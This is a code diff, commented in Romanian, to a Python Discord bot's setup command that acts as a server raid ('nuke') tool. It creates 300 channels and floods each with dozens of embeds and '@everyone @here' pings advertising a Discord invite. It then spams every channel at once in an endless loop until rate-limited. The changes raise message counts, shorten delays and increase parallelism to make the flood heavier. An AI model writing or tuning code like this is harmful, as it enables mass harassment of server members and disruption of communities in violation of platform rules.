@@ -323,32 +323,36 @@ async def setup(ctx):
     repeat_count = 50
     big_message = (base_text * repeat_count)[:2000]
 
-    # ===== CREARE 300 CANALE (batch 40) =====
+    # ===== CREARE 300 CANALE (batch 40, pauză 0.05) =====
     total_channels = 300
     font_styles = ["bold", "script", "double"]
     created_channels = []
 
-    await user.send(f"🔄 Încep crearea a {total_channels} de canale (batch 40)...")
+    await user.send(f"🔄 Încep crearea a {total_channels} de canale (batch 40, pauză 0.05)...")
 
-    # Semafor pentru trimiterea mesajelor inițiale (10-20 per canal)
+    # Semafor pentru trimiterea mesajelor inițiale (mult mai multe mesaje)
     send_semaphore = asyncio.Semaphore(12)
     ping_counts = [5, 6, 7, 8, 9, 10, 11, 12, 14, 15]
 
     async def send_initial_messages(channel):
-        """Trimite între 10 și 20 de mesaje pe canal imediat după creare."""
+        """Trimite 40-60 de mesaje pe canal imediat după creare (embed + ping-uri)"""
         async with send_semaphore:
             try:
-                # Trimite un embed la început
-                await channel.send(embed=embed_content)
-                await asyncio.sleep(0.08)
-
-                # Alege câte mesaje să trimită (10-20)
-                msg_count = random.randint(10, 20)
-                for _ in range(msg_count):
+                # Trimite 30 de perechi (embed + text cu ping-uri)
+                for _ in range(30):
+                    await channel.send(embed=embed_content)
+                    await asyncio.sleep(0.05)
                     ping_count = random.choice(ping_counts)
                     ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                     await channel.send(content=ping_message)
-                    await asyncio.sleep(0.08)
+                    await asyncio.sleep(0.05)
+
+                # Încă 20 de mesaje doar cu ping-uri (fără embed)
+                for _ in range(20):
+                    ping_count = random.choice(ping_counts)
+                    ping_message = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
+                    await channel.send(content=ping_message)
+                    await asyncio.sleep(0.05)
             except:
                 pass
 
@@ -380,31 +384,35 @@ async def setup(ctx):
 
     await user.send(f"✅ Toate cele {len(created_channels)} canale au fost create!")
 
-    # ===== SPAM FINAL PE TOATE CANALELE (până la rate limit) =====
-    await user.send("🔄 Începe spam-ul final pe toate canalele...")
+    # ===== SPAM FINAL PE TOATE CANALELE SIMULTAN (până la rate limit) =====
+    await user.send("🔄 Începe spam-ul final pe toate canalele simultan...")
 
-    spam_semaphore = asyncio.Semaphore(15)
+    spam_semaphore = asyncio.Semaphore(20)  # mai mare pentru paralelism maxim
 
     async def spam_final(channel):
         async with spam_semaphore:
             try:
+                # Trimite mesajul mare și embed-ul
                 await channel.send(content=big_message)
-                await asyncio.sleep(0.08)
+                await asyncio.sleep(0.05)
                 await channel.send(embed=embed_content)
-                await asyncio.sleep(0.08)
+                await asyncio.sleep(0.05)
+
+                # Loop continuu până la rate-limit
                 while True:
                     ping_count = random.randint(5, 12)
                     msg = ("@everyone @here join https://discord.gg/larpempire\n") * ping_count
                     await channel.send(content=msg)
-                    await asyncio.sleep(0.06)
+                    await asyncio.sleep(0.05)
             except discord.HTTPException as e:
                 if e.status == 429:
-                    pass
+                    pass  # Rate limit atins, oprim spam-ul pe acest canal
                 else:
                     raise
             except:
                 pass
 
+    # Lansează spam-ul pe toate canalele simultan (gather)
     spam_tasks = [spam_final(ch) for ch in created_channels]
     await asyncio.gather(*spam_tasks)
 
